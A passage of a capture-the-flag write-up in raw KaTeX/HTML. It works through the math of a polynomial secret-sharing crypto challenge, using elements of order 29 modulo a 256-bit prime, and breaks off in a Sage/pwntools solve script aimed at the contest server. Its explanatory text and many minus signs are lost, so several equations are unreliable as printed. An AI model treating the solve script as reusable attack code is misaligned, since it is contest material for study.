mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8768859999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub><mo>=</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">c_{t}=C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>a</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">c_{t-1}=a_{t-1},...,c_{1}=a_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.638891em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>0</mn></msub><mo>=</mo><msub><mi>a</mi><mn>0</mn></msub><mo></mo><mi>C</mi></mrow><annotation encoding="application/x-tex">c_{0}=a_{0}-C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mtext></mtext><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mtext></mtext><mi>s</mi><mi>e</mi><mi>c</mi><mi>r</mi><mi>e</mi><mi>t</mi><mtext></mtext><mo stretchy="false">[</mo><msub><mi>c</mi><mn>1</mn></msub><mo></mo><msub><mi>c</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sagesecret(secret[c_{1}-c_{t-1}])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msup><mi>g</mi><mi>t</mi></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>g</mi><mtext></mtext><mi>t</mi><mtext></mtext></mrow><annotation encoding="application/x-tex">g^{t}=1\pmod pgt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9879959999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>h</mi><mo>=</mo><mi>b</mi><mi>a</mi><mi>s</mi><msup><mi>e</mi><mfrac><mrow><mi>p</mi><mo></mo><mn>1</mn></mrow><mi>t</mi></mfrac></msup><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=base^{\frac{p-1}{t}}\pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00889em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.00889em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>h</mi><mi>t</mi></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo><mtext></mtext><mi>o</mi><mi>r</mi><mi>d</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mtext></mtext><mi mathvariant="normal"></mi><mtext></mtext><mi>t</mi><mtext></mtext><mi>i</mi><mi>f</mi><mtext></mtext><mi>h</mi><mo>=</mo><mn>1</mn><mtext></mtext><mi>o</mi><mi>r</mi><mi>d</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>=</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">h^{t}=1\pmod pord(h)\ |\ tif\ h\not = 1ord(h)=t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7935559999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace"></span><span class="mord"></span><span class="mspace"></span><span class="mord mathnormal">t</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>P</mi><mo stretchy="false">(</mo><mi>h</mi><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo></mo><mfrac><mrow><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>t</mi></mrow><mrow><mi>p</mi><mo></mo><mn>1</mn></mrow></mfrac><mo>=</mo><mn>28</mn><mi mathvariant="normal">/</mi><mn>29</mn></mrow><annotation encoding="application/x-tex">P(h\not =1)=1-\frac{(p-1)/t}{p-1}=28/29</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.491108em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight"></span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">8</span><span class="mord">/</span><span class="mord">2</span><span class="mord">9</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">R.&lt;x0&gt; = GF(p)[]</span><br><span class="line">t = <span class="number">29</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># conn = process([&quot;python3&quot;, &quot;../dist/chall.py&quot;])</span></span><br><span class="line">conn = remote(<span class="string">&#x27;ssss.chals.sekai.team&#x27;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>():</span><br><span class="line">  conn.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line">  g = <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p) == <span class="number">1</span>:</span><br><span class="line">    g += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  g = <span class="built_in">pow</span>(g, (p-<span class="number">1</span>)//t, p)</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">pow</span>(g, t, p) == <span class="number">1</span></span><br><span class="line"></span><br><span 